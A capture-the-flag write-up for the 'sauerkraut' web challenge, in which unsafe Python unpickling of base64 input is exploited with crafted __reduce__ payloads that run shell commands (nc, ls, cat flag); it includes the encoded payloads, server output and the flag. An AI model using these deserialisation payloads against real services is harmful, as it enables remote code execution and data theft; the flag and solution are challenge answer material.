# sauerkraut

## Challenge

We are presented with a webpage with an input and output field.
There is no explanation about the format of the input or output.

We can type plaintext in the input field and submit it, which sends our input to the remote server.
The server returns a response in plaintext, which is displayed in the output box.

## Solution

If we just enter the placeholder text, we get a useful error message as our response:

```
Input:
Enter text here...

Output:
Invalid base64-encoded string: number of data characters (13) cannot be 1 more than a multiple of 4
```

The program clearly expects a base64 input, so we can try something generic such as "AAAA" to see how it responds:

```
Input:
AAAA

Output:
invalid load key, '\x00'.
```

Googling this error message brings up posts about unpickling in Python, which is used to deserialise data.
This process is notoriously unsafe and it is strongly advised to avoid unpicking any user-controlled data.

We can use this by writing our own Python code and pickling it such that, when unpickled, the program executes our payload.
To do so, I used an example from https://blog.nelhage.com/2011/03/exploiting-pickle/

If we try using code from the article to call `nc`, the output is a single number:

```py
#!/usr/bin/env python2

import cPickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('nc', ))

print "nc:"
print base64.b64encode(cPickle.dumps(Exploit()))
```

```
Input:
Y3Bvc2l4CnN5c3RlbQpwMQooUyduYycKcDIKdHAzClJwNAou

Output:
32512
```

Googling this error code as "python system 32512" tells us that this is an error code which is often seen when the program cannot find the binary to execute.

We now know that netcat is likely not available, but also that the output is the return value of our code.

Using this information, we can modify our code to use `subprocess.check_output()` such that the return value is the output of our shell commands.

For example, the command `ls` can be encoded as:

```py
#!/usr/bin/env python2

import cPickle
import subprocess
import base64

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, ('ls', ))

print base64.b64encode(cPickle.dumps(Exploit()))
```

```
Input:
Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CnAxCihTJ2xzJwpwMgp0cDMKUnA0Ci4=

Output:
b'app\nflag\ngunicorn_config.py\nrequirements.txt\n
```

We can see that the flag file is located in the same directory as the application.

Using the same technique, we can read this flag file:

```py
#!/usr/bin/env python2

import cPickle
import subprocess
import base64

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat','flag'], ))

print base64.b64encode(cPickle.dumps(Exploit()))
```

Input:
Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CnAxCigobHAyClMnY2F0JwpwMwphUydmbGFnJwpwNAphdFJwNQou

Output:
b'SNYK{6854ecb17f51afdf2610f741dd07bd6099c616e4ab1a403eb14fa8639e1fb0af}\n'
```

## Exploit

```py
#!/usr/bin/env python2

import cPickle
import subprocess
import base64

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, ('ls', ))

print "ls:"
print base64.b64encode(cPickle.dumps(Exploit()))

print ""

class Exploit(object):
    def __reduce__(self):
        return (subprocess.check_output, (['cat','flag'], ))

print "cat flag:"
print base64.b64encode(cPickle.dumps(Exploit()))
```

```
ls:
Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CnAxCihTJ2xzJwpwMgp0cDMKUnA0Ci4=

cat flag:
Y3N1YnByb2Nlc3MKY2hlY2tfb3V0cHV0CnAxCigobHAyClMnY2F0JwpwMwphUydmbGFnJwpwNAphdFJwNQou
```

## Flag

`SNYK{6854ecb17f51afdf2610f741dd07bd6099c616e4ab1a403eb14fa8639e1fb0af}`

